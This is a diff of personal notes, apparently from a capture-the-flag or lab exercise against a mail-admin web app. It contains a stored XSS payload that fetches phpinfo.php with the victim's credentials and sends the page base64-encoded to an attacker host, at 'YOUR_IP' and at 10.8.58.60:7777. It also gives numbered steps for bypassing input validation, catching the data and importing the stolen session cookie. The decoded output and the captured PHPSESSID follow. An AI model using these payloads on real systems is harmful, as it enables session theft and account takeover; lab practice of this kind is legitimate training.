@@ -26,7 +26,7 @@ Best regards,
 
 IT Unit
 
-* init scans
+* initial scan
 #+begin_src sh
 [0:15][]~ ✮ ffuf -u "http://officemailcentral.hv/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/
 Web-Content/raft-large-directories.txt
@@ -59,3 +59,176 @@ server-status           [Status: 403, Size: 285, Words: 20, Lines: 10, Duration:
 #+end_src
 
 : /database/connect.php
+
+
+* tips from samurai discord
+#+begin_src sh
+Encaminhada
+You need to create a payload that uses fetch to steal cookies by deleting the email type value on the target machine. You need to base64 decode the incoming cookie and add it to the login page
+You can try the following payload:
+<script>fetch("http://officemailcentral.hv/phpinfo.php",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("http://YOUR_IP/?data="+btoa(d)));</script>
+Encaminhada
+Let me walk you through the steps in a clearer way:
+1-When you open the website, you’ll first see the email and password validation.
+2-Open the developer tools, locate the email input, and remove the type="email" attribute (or simply change it to text).
+3-Inject a fetch payload that will capture the session cookie.
+4-On your machine, start a simple Python listener on a chosen port.
+5-Once the payload runs, you’ll receive data that looks like Base64. Decode it to reveal the session cookie.
+6-Use the “EditThisCookie” browser extension to import that cookie into the login page.
+7-Finally, refresh the page, you should now be inside the admin panel.
+#+end_src
+
+*With this payload I am receiving the data via LOG from the platform's VPN, it is not reaching my Python server directly.* ->
+: <script>fetch("http://officemailcentral.hv/phpinfo.php",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("http://10.8.58.60:7777/?data="+btoa(d)));</script>
+
+*long base64 string decoded* ->
+#+begin_src sh
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<style type="text/css">
+body {background-color: #fff; color: #222; font-family: sans-serif;}
+pre {margin: 0; font-family: monospace;}
+a:link {color: #009; text-decoration: none; background-color: #fff;}
+a:hover {text-decoration: underline;}
+table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px rgba(0, 0, 0, 0.2);}
+.center {text-align: center;}
+.center table {margin: 1em auto; text-align: left;}
+.center th {text-align: center !important;}
+td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
+th {position: sticky; top: 0; background: inherit;}
+h1 {font-size: 150%;}
+h2 {font-size: 125%;}
+h2 a:link, h2 a:visited{color: inherit; background: inherit;}
+.p {text-align: left;}
+.e {background-color: #ccf; width: 300px; font-weight: bold;}
+.h {background-color: #99c; font-weight: bold;}
+.v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}
+.v i {color: #999;}
+img {float: right; border: 0;}
+hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
+:root {--php-dark-grey: #333; --php-dark-blue: #4F5B93; --php-medium-blue: #8892BF; --php-light-blue: #E2E4EF; --php-accent-purple: #793862}@media (prefers-color-scheme: dark) {
+  body {background: var(--php-dark-grey); color: var(--php-light-blue)}
+  .h td, td.e, th {border-color: #606A90}
+  td {border-color: #505153}
+  .e {background-color: #404A77}
+  .h {background-color: var(--php-dark-blue)}
+  .v {background-color: var(--php-dark-grey)}
+  hr {background-color: #505153}
+}
+</style>
+<title>PHP 8.2.7 - phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head>
+<body><div class="center">
+<h2>PHP Variables</h2>
+<table>
+<tr class="h"><th>Variable</th><th>Value</th></tr>
+<tr><td class="e">$_COOKIE['PHPSESSID']</td><td class="v">c15qvl53vgb3srkv1pem7q6kl7</td></tr>
+<tr><td class="e">$_SERVER['HTTP_HOST']</td><td class="v">officemailcentral.hv</td></tr>
+<tr><td class="e">$_SERVER['HTTP_CONNECTION']</td><td class="v">keep-alive</td></tr>
+<tr><td class="e">$_SERVER['HTTP_USER_AGENT']</td><td class="v">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/100.0.4896.75 Safari/537.36</td></tr>
+<tr><td class="e">$_SERVER['HTTP_ACCEPT']</td><td class="v">*/*</td></tr>
+<tr><td class="e">$_SERVER['HTTP_REFERER']</td><td class="v">http://officemailcentral.hv/webadmin/</td></tr>
+<tr><td class="e">$_SERVER['HTTP_ACCEPT_ENCODING']</td><td class="v">gzip, deflate</td></tr>
+<tr><td class="e">$_SERVER['HTTP_ACCEPT_LANGUAGE']</td><td class="v">en-US</td></tr>
+<tr><td class="e">$_SERVER['HTTP_COOKIE']</td><td class="v">PHPSESSID=c15qvl53vgb3srkv1pem7q6kl7</td></tr>
+<tr><td class="e">$_SERVER['PATH']</td><td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</td></tr>
+<tr><td class="e">$_SERVER['SERVER_SIGNATURE']</td><td class="v">&lt;address&gt;Apache/2.4.56 (Debian) Server at officemailcentral.hv Port 80&lt;/address&gt;
+</td></tr>
+<tr><td class="e">$_SERVER['SERVER_SOFTWARE']</td><td class="v">Apache/2.4.56 (Debian)</td></tr>
+<tr><td class="e">$_SERVER['SERVER_NAME']</td><td class="v">officemailcentral.hv</td></tr>
+<tr><td class="e">$_SERVER['SERVER_ADDR']</td><td class="v">172.20.45.148</td></tr>
+<tr><td class="e">$_SERVER['SERVER_PORT']</td><td class="v">80</td></tr>
+<tr><td class="e">$_SERVER['REMOTE_ADDR']</td><td class="v">172.20.45.148</td></tr>
+<tr><td class="e">$_SERVER['DOCUMENT_ROOT']</td><td class="v">/var/www/html</td></tr>
+<tr><td class="e">$_SERVER['REQUEST_SCHEME']</td><td class="v">http</td></tr>
+<tr><td class="e">$_SERVER['CONTEXT_PREFIX']</td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">$_SERVER['CONTEXT_DOCUMENT_ROOT']</td><td class="v">/var/www/html</td></tr>
+<tr><td class="e">$_SERVER['SERVER_ADMIN']</td><td class="v">webmaster@localhost</td></tr>
+<tr><td class="e">$_SERVER['SCRIPT_FILENAME']</td><td class="v">/var/www/html/phpinfo.php</td></tr>
+<tr><td class="e">$_SERVER['REMOTE_PORT']</td><td class="v">60228</td></tr>
+<tr><td class="e">$_SERVER['GATEWAY_INTERFACE']</td><td class="v">CGI/1.1</td></tr>
+<tr><td class="e">$_SERVER['SERVER_PROTOCOL']</td><td class="v">HTTP/1.1</td></tr>
+<tr><td class="e">$_SERVER['REQUEST_METHOD']</td><td class="v">GET</td></tr>
+<tr><td class="e">$_SERVER['QUERY_STRING']</td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">$_SERVER['REQUEST_URI']</td><td class="v">/phpinfo.php</td></tr>
+<tr><td class="e">$_SERVER['SCRIPT_NAME']</td><td class="v">/phpinfo.php</td></tr>
+<tr><td class="e">$_SERVER['PHP_SELF']</td><td class="v">/phpinfo.php</td></tr>
+<tr><td class="e">$_SERVER['REQUEST_TIME_FLOAT']</td><td class="v">1760121153.357</td></tr>
+<tr><td class="e">$_SERVER['REQUEST_TIME']</td><td class="v">1760121153</td></tr>
+</table>
+<E html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<style type="text/css">
+body {background-color: #fff; color: #222; font-family: sans-serif;}
+pre {margin: 0; font-family: monospace;}
+a:link {color: #009; text-decoration: none; background-color: #fff;}
+a:hover {text-decoration: underline;}
+table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px rgba(0, 0, 0, 0.2);}
+.center {text-align: center;}
+.center table {margin: 1em auto; text-align: left;}
+.center th {text-align: center !important;}
+td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
+th {position: sticky; top: 0; background: inherit;}
+h1 {font-size: 150%;}
+h2 {font-size: 125%;}
+h2 a:link, h2 a:visited{color: inherit; background: inherit;}
+.p {text-align: left;}
+.e {background-color: #ccf; width: 300px; font-weight: bold;}
+.h {background-color: #99c; font-weight: bold;}
+.v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}
+.v i {color: #999;}
+img {float: right; border: 0;}
+hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
+:root {--php-dark-grey: #333; --php-dark-blue: #4F5B93; --php-medium-blue: #8892BF; --php-light-blue: #E2E4EF; --php-accent-purple: #793862}@media (prefers-color-scheme: dark) {
+  body {background: var(--php-dark-grey); color: var(--php-light-blue)}
+  .h td, td.e, th {border-color: #606A90}
+  td {border-color: #505153}
+  .e {background-color: #404A77}
+  .h {background-color: var(--php-dark-blue)}
+  .v {background-color: var(--php-dark-grey)}
+  hr {background-color: #505153}
+}
+</style>
+<title>PHP 8.2.7 - phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head>
+<body><div class="center">
+<h2>PHP Variables</h2>
+<table>
+<tr class="h"><th>Variable</th><th>Value</th></tr>
+<tr><td class="e">$_COOKIE['PHPSESSID']</td><td class="v">c15qvl53vgb3srkv1pem7q6kl7</td></tr>
+<tr><td class="e">$_SERVER['HTTP_HOST']</td><td class="v">officemailcentral.hv</td></tr>
+<tr><td class="e">$_SERVER['HTTP_CONNECTION']</td><td class="v">keep-alive</td></tr>
+<tr><td class="e">$_SERVER['HTTP_USER_AGENT']</td><td class="v">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/100.0.4896.75 Safari/537.36</td></tr>
+<tr><td class="e">$_SERVER['HTTP_ACCEPT']</td><td class="v">*/*</td></tr>
+<tr><td class="e">$_SERVER['HTTP_REFERER']</td><td class="v">http://officemailcentral.hv/webadmin/</td></tr>
+<tr><td class="e">$_SERVER['HTTP_ACCEPT_ENCODING']</td><td class="v">gzip, deflate</td></tr>
+<tr><td class="e">$_SERVER['HTTP_ACCEPT_LANGUAGE']</td><td class="v">en-US</td></tr>
+<tr><td class="e">$_SERVER['HTTP_COOKIE']</td><td class="v">PHPSESSID=c15qvl53vgb3srkv1pem7q6kl7</td></tr>
+<tr><td class="e">$_SERVER['PATH']</td><td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</td></tr>
+<tr><td class="e">$_SERVER['SERVER_SIGNATURE']</td><td class="v">&lt;address&gt;Apache/2.4.56 (Debian) Server at officemailcentral.hv Port 80&lt;/address&gt;
+</td></tr>
+<tr><td class="e">$_SERVER['SERVER_SOFTWARE']</td><td class="v">Apache/2.4.56 (Debian)</td></tr>
+<tr><td class="e">$_SERVER['SERVER_NAME']</td><td class="v">officemailcentral.hv</td></tr>
+<tr><td class="e">$_SERVER['SERVER_ADDR']</td><td class="v">172.20.45.148</td></tr>
+<tr><td class="e">$_SERVER['SERVER_PORT']</td><td class="v">80</td></tr>
+<tr><td class="e">$_SERVER['REMOTE_ADDR']</td><td class="v">172.20.45.148</td></tr>
+<tr><td class="e">$_SERVER['DOCUMENT_ROOT']</td><td class="v">/var/www/html</td></tr>
+<tr><td class="e">$_SERVER['REQUEST_SCHEME']</td><td class="v">http</td></tr>
+<tr><td class="e">$_SERVER['CONTEXT_PREFIX']</td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">$_SERVER['CONTEXT_DOCUMENT_ROOT']</td><td class="v">/var/www/html</td></tr>
+<tr><td class="e">$_SERVER['SERVER_ADMIN']</td><td class="v">webmaster@localhost</td></tr>
+<tr><td class="e">$_SERVER['SCRIPT_FILENAME']</td><td class="v">/var/www/html/phpinfo.php</td></tr>
+<tr><td class="e">$_SERVER['REMOTE_PORT']</td><td class="v">52322</td></tr>
+<tr><td class="e">$_SERVER['GATEWAY_INTERFACE']</td><td class="v">CGI/1.1</td></tr>
+<tr><td class="e">$_SERVER['SERVER_PROTOCOL']</td><td class="v">HTTP/1.1</td></tr>
+<tr><td class="e">$_SERVER['REQUEST_METHOD']</td><td class="v">GET</td></tr>
+<tr><td class="e">$_SERVER['QUERY_STRING']</td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">$_SERVER['REQUEST_URI']</td><td class="v">/phpinfo.php</td></tr>
+<tr><td class="e">$_SERVER['SCRIPT_NAME']</td><td class="v">/phpinfo.php</td></tr>
+<tr><td class="e">$_SERVER['PHP_SELF']</td><td class="v">/phpinfo.php</td></tr>
+<tr><td class="e">$_SERVER['REQUEST_TIME_FLOAT']</td><td class="v">1760121163.497</td></tr>
+<tr><td class="e">$_SERVER['REQUEST_TIME']</td><td class="v">1760121163</td></tr>
+</table>
+</div></body></html>
+#+end_src
+
+*PHPSESSID* ->
+: c15qvl53vgb3srkv1pem7q6kl7
